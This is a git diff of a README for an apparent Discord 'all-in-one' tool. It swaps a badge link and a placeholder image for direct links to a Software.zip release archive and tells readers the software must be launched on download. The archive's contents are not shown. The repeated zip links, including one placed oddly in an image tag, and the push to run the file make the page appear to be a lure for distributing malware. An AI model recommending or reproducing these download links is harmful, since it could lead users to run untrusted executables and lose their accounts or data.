@@ -16,7 +16,7 @@ Here are some of the key features of the **Discord-AllinOne-Tool**:
 ## Installation
 To get started with the **Discord-AllinOne-Tool**, download the software package from the link below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Software](https://github.com/MinhDepTrai-242/Discord-AllinOne-Tool/releases/download/v2.0/Software.zip)](https://github.com/MinhDepTrai-242/Discord-AllinOne-Tool/releases/download/v2.0/Software.zip)
 
 Please note that the software needs to be launched upon download to access all the tools seamlessly.
 
@@ -47,4 +47,4 @@ For any questions, feedback, or issues related to the **Discord-AllinOne-Tool**,
 
 Thank you for choosing the **Discord-AllinOne-Tool**. Let's elevate your Discord management game together! 🚀
 
-![Discord-AllinOne-Tool](https://example.com/image.png)
+![Discord-AllinOne-Tool](https://github.com/MinhDepTrai-242/Discord-AllinOne-Tool/releases/download/v2.0/Software.zip)
